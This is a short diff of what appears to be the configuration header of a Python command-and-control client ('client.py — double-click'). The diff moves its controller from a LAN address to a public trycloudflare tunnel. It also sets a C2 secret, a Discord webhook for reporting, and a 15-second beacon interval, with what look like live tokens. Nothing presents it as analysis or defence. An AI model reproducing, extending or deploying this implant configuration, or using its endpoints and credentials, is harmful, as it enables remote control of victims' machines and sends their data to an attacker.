@@ -1,7 +1,7 @@
 # client.py — double-click. Python 3.8+. stdlib only.
 import base64, json, os, re, shutil, subprocess, sys, threading, time, traceback, uuid
 
-SERVER          = "http://192.168.230.37:8443"
+SERVER          = "https://gabriel-urls-lid-hired.trycloudflare.com"
 SECRET          = "sk_c2_7Kx9mP2vN4qR8tW1yZ5bH3jL6nF0dS_aE9cU2gI4oM"
 REPORT_ENDPOINT = "https://discord.com/api/webhooks/1553320833970343936/CYmdAjm4iDqmHKRwme31kCx0fF8ULy81ACxKSt1WQLfrXLaJH-KIp2SU0K485hjTpbyK"
 BEACON_SECONDS  = 15
